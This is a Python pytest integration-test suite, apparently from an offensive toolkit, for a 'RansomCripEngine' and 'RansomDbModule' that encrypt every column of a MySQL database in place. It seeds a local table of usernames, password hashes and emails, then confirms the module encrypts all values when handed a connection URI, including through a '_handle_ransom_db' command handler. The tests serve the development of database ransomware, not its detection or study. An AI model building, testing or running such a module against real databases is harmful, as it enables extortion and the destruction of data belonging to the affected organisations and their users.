import os
import hashlib
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


MYSQL_URI = os.getenv(
    "MYSQL_TEST_URI",
    "mysql://root:testpass123@localhost:13306/testdb"
)

_NONCE_LEN = 12


def _can_connect_mysql() -> bool:
    try:
        import pymysql
        from urllib.parse import urlparse
        p = urlparse(MYSQL_URI)
        conn = pymysql.connect(
            host=p.hostname, port=p.port or 3306,
            user=p.username, password=p.password or "",
            database=p.path.lstrip("/"),
            connect_timeout=5,
        )
        conn.close()
        return True
    except Exception:
        return False


def _decrypt_hex(hex_str: str) -> bytes:
    blob = bytes.fromhex(hex_str)
    key_bytes = hashlib.sha256(
        os.getenv("KEY_CRIP_DATA", "").encode("utf-8")
    ).digest()
    aesgcm = AESGCM(key_bytes)
    nonce = blob[:_NONCE_LEN]
    ct_and_tag = blob[_NONCE_LEN:]
    return aesgcm.decrypt(nonce, ct_and_tag, None)


skip_no_mysql = pytest.mark.skipif(
    not _can_connect_mysql(),
    reason="MySQL não disponível em localhost:13306"
)


@skip_no_mysql
class TestRansomMysql:

    @pytest.fixture(autouse=True)
    def setup_tables(self):
        import pymysql
        from urllib.parse import urlparse

        p = urlparse(MYSQL_URI)
        conn = pymysql.connect(
            host=p.hostname, port=p.port or 3306,
            user=p.username, password=p.password or "",
            database=p.path.lstrip("/"),
            read_timeout=10,
            write_timeout=10,
            connect_timeout=5,
        )
        cursor = conn.cursor()

        cursor.execute("DROP TABLE IF EXISTS test_ransom")
        cursor.execute("""
            CREATE TABLE test_ransom (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username TEXT NOT NULL,
                password_hash TEXT NOT NULL,
                email TEXT NOT NULL
            )
        """)

        cursor.executemany(
            "INSERT INTO test_ransom (username, password_hash, email) VALUES (%s, %s, %s)",
            [
                ("alice",   "bcrypt:$2b$12$hash1...", "alice@corp.com"),
                ("bob",     "bcrypt:$2b$12$hash2...", "bob@corp.com"),
                ("carol",   "bcrypt:$2b$12$hash3...", "carol@corp.com"),
                ("dave",    "bcrypt:$2b$12$hash4...", "dave@corp.com"),
                ("eve",     "bcrypt:$2b$12$hash5...", "eve@corp.com"),
                ("frank",   "bcrypt:$2b$12$hash6...", "frank@corp.com"),
                ("grace",   "bcrypt:$2b$12$hash7...", "grace@corp.com"),
                ("heidi",   "bcrypt:$2b$12$hash8...", "heidi@corp.com"),
                ("ivan",    "bcrypt:$2b$12$hash9...", "ivan@corp.com"),
                ("judy",    "bcrypt:$2b$12$hash10..", "judy@corp.com"),
            ]
        )
        conn.commit()

        yield conn, cursor

        cursor.execute("DROP TABLE IF EXISTS test_ransom")
        conn.commit()
        conn.close()

    def test_mysql_adapter_connects(self, setup_tables):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter

        adapter = MySqlAdapter(MYSQL_URI)
        tables = adapter.list_tables()

        assert "test_ransom" in tables

    def test_mysql_adapter_gets_columns(self, setup_tables):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter

        adapter = MySqlAdapter(MYSQL_URI)
        columns = adapter.get_columns("test_ransom")

        col_names = [c.name for c in columns]
        assert "id" not in col_names
        assert "username" in col_names
        assert "password_hash" in col_names
        assert "email" in col_names

    def test_mysql_columns_have_values(self, setup_tables):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter

        adapter = MySqlAdapter(MYSQL_URI)
        columns = adapter.get_columns("test_ransom")

        for col in columns:
            assert len(col.values) == 10, f"Coluna {col.name} tem {len(col.values)} valores"

    def test_encrypt_single_column(self, setup_tables):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        conn, cursor = setup_tables
        adapter = MySqlAdapter(MYSQL_URI)
        engine  = RansomCripEngine()

        columns = adapter.get_columns("test_ransom")
        pwd_col = next(c for c in columns if c.name == "password_hash")

        count = [0]
        def write_fn(enc: bytes) -> None:
            pwd_col.write(enc)
            count[0] += 1

        engine.execute(write_fn, pwd_col.values)

        assert count[0] == 10

        cursor.execute("SELECT password_hash FROM test_ransom ORDER BY id")
        rows = cursor.fetchall()

        for row in rows:
            encrypted_hex = row[0]
            assert len(encrypted_hex) > 56, f"Encrypted too short: {len(encrypted_hex)}"
            bytes.fromhex(encrypted_hex)

    def test_encrypt_all_columns_roundtrip(self, setup_tables):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        conn, cursor = setup_tables
        adapter = MySqlAdapter(MYSQL_URI)
        engine  = RansomCripEngine()

        columns = adapter.get_columns("test_ransom")
        total_encrypted = 0

        for col in columns:
            count = [0]
            def write_fn(enc: bytes, _col=col) -> None:
                _col.write(enc)
                count[0] += 1
            engine.execute(write_fn, col.values)
            total_encrypted += count[0]

        assert total_encrypted == 30

        cursor.execute("SELECT username FROM test_ransom WHERE id = 1")
        enc_hex = cursor.fetchone()[0]
        decrypted = _decrypt_hex(enc_hex)
        assert decrypted == b"alice"

        cursor.execute("SELECT email FROM test_ransom WHERE id = 3")
        enc_hex = cursor.fetchone()[0]
        decrypted = _decrypt_hex(enc_hex)
        assert decrypted == b"carol@corp.com"

    def test_full_sql_pipeline(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule

        module = RansomDbModule(broadcast=lambda _: None)
        count = module._run_sql("MySQL", MYSQL_URI)

        assert count >= 30

    @pytest.mark.asyncio
    async def test_full_handle_ransom_db(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule

        logs = []
        module = RansomDbModule(broadcast=lambda dto: logs.append(dto))

        result = await module._handle_ransom_db({
            "db": "MySQL",
            "mode": "single",
            "uri": MYSQL_URI,
        })

        assert result.success is True
        assert result.data["encrypted"] >= 30
        assert result.data["db"] == "MySQL"

    def test_pipe_separated_uri(self, setup_tables):
        from infra.modules.RansomDbModule import RansomDbModule

        module = RansomDbModule(broadcast=lambda _: None)

        pipe_uri = "localhost|13306|root|testpass123|testdb"
        count = module._run_sql("MySQL", pipe_uri)

        assert count >= 30

    def test_invalid_uri_fails(self):
        from infra.adapters.sql.MySqlAdapter import MySqlAdapter

        with pytest.raises(Exception):
            MySqlAdapter("mysql://root:wrongpass@localhost:13306/testdb")
